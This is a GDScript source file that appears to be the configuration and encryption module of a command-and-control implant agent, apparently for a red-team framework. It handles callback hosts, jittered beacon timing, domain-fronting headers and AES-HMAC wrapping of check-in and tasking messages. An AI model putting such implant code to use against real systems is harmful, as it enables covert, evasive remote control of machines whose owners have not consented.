extends Node

enum TRANSPORT_TYPE {WEBSOCKET, HTTP, TCP}
const TransportWebsocket = preload("res://transport/websocket.gd")
const PKCS5 = preload("res://scripts/pkcs5.gd")

const FILE_NAME = "res://config_zippy-websocket.json"
const MAX_CONNECT_ATTEMPT = 3

var setting = {}
var aes = null
var hmac = null
var crypto = null
var ek = null
var dk = null
var rng

@export var sleep_time:int = 0

func _ready():
	rng = RandomNumberGenerator.new()
	rng.randomize()

	if FileAccess.file_exists(FILE_NAME):
		var file = FileAccess.open(FILE_NAME, FileAccess.READ)

		var test_json_conv = JSON.new()
		test_json_conv.parse(file.get_as_text())
		var data = test_json_conv.get_data()

		file.close()

		if typeof(data) == TYPE_DICTIONARY:
			print_debug("config: ", data)
			setting = data
			
			if setting.has("AESPSK"):
				var aespsk = setting.get("AESPSK")

				if aespsk.has("value") and aespsk.get("value") == "aes256_hmac":
					if aespsk.has("enc_key") and aespsk.get("enc_key") != null:
						if aespsk.has("dec_key") and aespsk.get("dec_key") != null:
							aes = AESContext.new()
							hmac = HMACContext.new()
							crypto = Crypto.new()
							ek = Marshalls.base64_to_raw(aespsk.get("enc_key"))
							dk = Marshalls.base64_to_raw(aespsk.get("dec_key"))

		else:
			printerr("Corrupted data!")
	else:
		printerr("No saved data!")

func is_encrypted():
	if aes != null and hmac != null and crypto != null:
		return true

	return false

func get_verify():
	if setting.has("tls_verify"):
		return setting.get("tls_verify")

	return false

func get_payload_uuid():

	if setting.has("payload_uuid"):
		return setting.get("payload_uuid")

	return ""

func get_callback_uuid():

	if setting.has("callback_uuid"):
		return setting.get("callback_uuid")

	return ""

func set_callback_period(period:int):
	setting["callback_interval"] = int(period)

func get_callback_wait_time():

	var callback_period = 10 # unit seconds
	var callback_jitter = 5 # unit seconds

	if setting.has("callback_interval"):
		callback_period = int(setting.get("callback_interval"))

	if setting.has("callback_jitter"):
		callback_jitter = int(setting.get("callback_jitter"))

	if callback_jitter > callback_period:
		callback_period = callback_jitter # TODO: can we do better than this?

	var rr = rng.randi() % callback_period*1.1
	
	if rr < callback_jitter/1.2:
		rr *=-1
	
	var wait_time = callback_period + rr

	if wait_time <= 0:
		wait_time = 1
	
	wait_time += sleep_time

	sleep_time = 0

	return wait_time

func get_headers():
	var headers = PackedStringArray()

	if setting.has("USER_AGENT") and not setting.get("USER_AGENT").is_empty():
		headers.append("User-Agent: %s" %  setting.get("USER_AGENT"))

	if setting.has("domain_front") and not setting.get("domain_front").is_empty():
		headers.append("Host: %s" %  setting.get("domain_front"))

	return headers

func get_callback_uri():
	var callback_host = ""

	if setting.has("callback_host"):
		callback_host += setting.get("callback_host")

	if setting.has("callback_port"):
		callback_host += ":%s" % String(setting.get("callback_port"))

	if setting.has("ENDPOINT_REPLACE"):
		callback_host += "/%s" % setting.get("ENDPOINT_REPLACE")

	return callback_host

func set_callback_uuid(uuid):
	setting["callback_uuid"] = uuid

func get_transport(transport, agent):
	var uri = get_callback_uri()

	if uri.begins_with("ws"):
		return TransportWebsocket.new($".", agent, transport)	

	return null

func is_checkin_complete():
	return get_callback_uuid() != ""
		

func get_uuid():
	var uuid = get_payload_uuid()

	if is_checkin_complete():
		uuid = get_callback_uuid()

	return uuid

func parse_checkin(data):
	# TODO: enc/dec key parsing / init?
	set_callback_uuid(data.get("payload").get("id"))

# AES256 Encryption Details
# Padding: PKCS7, block size of 16
# Mode: CBC
# IV is 16 random bytes
# Final message: IV + CT + HMAC
# where HMAC is SHA256 with the same AES key over (IV + CT)

func wrap_payload(payload:String):
	if is_encrypted():
		var iv = crypto.generate_random_bytes(16)
		aes.start(AESContext.MODE_CBC_ENCRYPT, ek, iv)
		var iv_ct = iv + aes.update(PKCS5.pad(payload.to_utf8_buffer(), 16))
		aes.finish()
		var err = hmac.start(HashingContext.HASH_SHA256, ek)
		if err != OK:
			print_debug("things just went sideways...")
			pass
		err = hmac.update(iv_ct)
		if err != OK:
			print_debug("things just went sideways...")
			pass
		return Marshalls.raw_to_base64(get_uuid().to_utf8_buffer() + iv_ct + hmac.finish()).to_utf8_buffer()
	else:
		return Marshalls.utf8_to_base64(get_uuid() + payload).to_utf8_buffer()

func unwrap_payload(packet:String):
	var ret = {
		"action": "",
		"payload": "",
		"uuid": "",
		"status": false
	}

	var data:PackedByteArray = Marshalls.base64_to_raw(packet)

	ret["uuid"] = data.slice(0, 36).get_string_from_utf8()

	var test_json_conv = JSON.new()
	var chunk:PackedByteArray = data.slice(36)

	if is_encrypted():
		var iv = data.slice(36, 52)
		chunk = data.slice(52, data.size()-32)

		var err = hmac.start(HashingContext.HASH_SHA256, dk)
		if err != OK:
			print_debug("things just went sideways...")
			OS.kill(OS.get_process_id())

		err = hmac.update(iv+chunk)
		if err != OK:
			print_debug("things just went sideways...")
			OS.kill(OS.get_process_id())

		if data.slice(data.size()-32) != hmac.finish():
			print_debug("hash mismatch")
			OS.kill(OS.get_process_id())

		aes.start(AESContext.MODE_CBC_DECRYPT, dk, iv)
		chunk = PKCS5.unpad(aes.update(chunk))
		aes.finish()

	# oof, assumes utf8...can we?
	test_json_conv.parse(chunk.get_string_from_utf8())
	ret["payload"] = test_json_conv.get_data()

	if ret["payload"].has("action"):
		ret["action"] = ret["payload"].get("action")

	if ret["payload"].has("status"):
		ret["status"] = ret["payload"].get("status") == "success"

	return ret

func get_ek():
	if is_encrypted():
		return Marshalls.raw_to_base64(ek)
	
	return ""
	
func get_dk():
	if is_encrypted():
		return Marshalls.raw_to_base64(dk)
	
	return ""
